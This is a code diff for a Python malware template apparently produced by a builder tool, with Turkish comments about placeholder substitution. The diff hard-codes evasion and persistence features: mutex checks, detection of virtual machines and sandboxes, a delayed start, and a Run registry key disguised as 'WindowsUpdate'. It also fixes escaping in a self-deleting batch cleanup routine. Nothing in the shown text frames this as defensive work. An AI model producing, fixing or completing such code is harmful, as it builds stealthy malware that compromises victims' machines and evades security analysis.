@@ -15,7 +15,7 @@ def elevate_admin():
     return True
 
 def check_mutex():
-    if {MUTEX}:
+    if True:  # {MUTEX} - Builder bunu True/False ile değiştirecek
         try:
             mutex = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)
             if ctypes.windll.kernel32.GetLastError() == 183:
@@ -26,7 +26,7 @@ def check_mutex():
     return None
 
 def check_vm():
-    if {ANTI_VM}:
+    if True:  # {ANTI_VM} - Builder bunu True/False ile değiştirecek
         try:
             vm_indicators = ["VMware", "VirtualBox", "VBox", "VMnet", "VirtIO", "QEMU", "Xen", "Hyper-V"]
             
@@ -70,16 +70,16 @@ def check_sandbox():
         return False
 
 def startup_delay():
-    if {STARTUP_DELAY}:
-        time.sleep({DELAY_SECONDS})
+    if True:  # {STARTUP_DELAY} - Builder bunu True/False ile değiştirecek
+        time.sleep(30)  # {DELAY_SECONDS} - Builder bunu sayı ile değiştirecek
 
 def add_persistence():
-    if {PERSIST}:
+    if True:  # {PERSIST} - Builder bunu True/False ile değiştirecek
         try:
             exe_path = sys.executable if hasattr(sys, 'frozen') else sys.argv[0]
             
             key = winreg.HKEY_CURRENT_USER
-            key_path = r"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run"
+            key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
             with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as reg_key:
                 winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, exe_path)
         except:
@@ -90,7 +90,7 @@ def self_destruct():
         bat_path = os.path.join(tempfile.gettempdir(), "cleanup.bat")
         exe_path = sys.executable if hasattr(sys, 'frozen') else sys.argv[0]
         
-        escaped_path = exe_path.replace('\\\\', '\\\\\\\\')
+        escaped_path = exe_path.replace('\\', '\\\\')
         
         bat_lines = [
             '@echo off',
@@ -101,7 +101,7 @@ def self_destruct():
             'exit'
         ]
         
-        bat_content = '\\\\n'.join(bat_lines)
+        bat_content = '\n'.join(bat_lines)
         
         with open(bat_path, 'w', encoding='utf-8') as f:
             f.write(bat_content)
